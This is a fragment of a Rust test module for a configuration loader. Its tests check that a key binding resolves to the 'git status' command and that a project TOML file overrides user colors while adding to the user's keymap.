        );
        assert_eq!(
            out,
            ResolverOutcome::User(BoundAction::UnixCmd("git status".to_string()))
        );
    }

    #[test]
    fn project_overrides_user_colors_but_appends_keymap() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let proj = tmp.path().join("proj.toml");
        std::fs::write(
            &user,
            r##"
keymap = ["map f unix file %"]

[colors]
dir = "#111111"
"##,
        )
        .unwrap();
        std::fs::write(
            &proj,
            r##"
keymap = ["map g unix git status"]

[colors]
dir = "#222222"
"##,
        )
        .unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&proj)]).unwrap();
        assert_eq!(cfg.colors.dir.as_deref(), Some("#222222"));
        assert_eq!(cfg.bindings.len(), 2);
    }
}
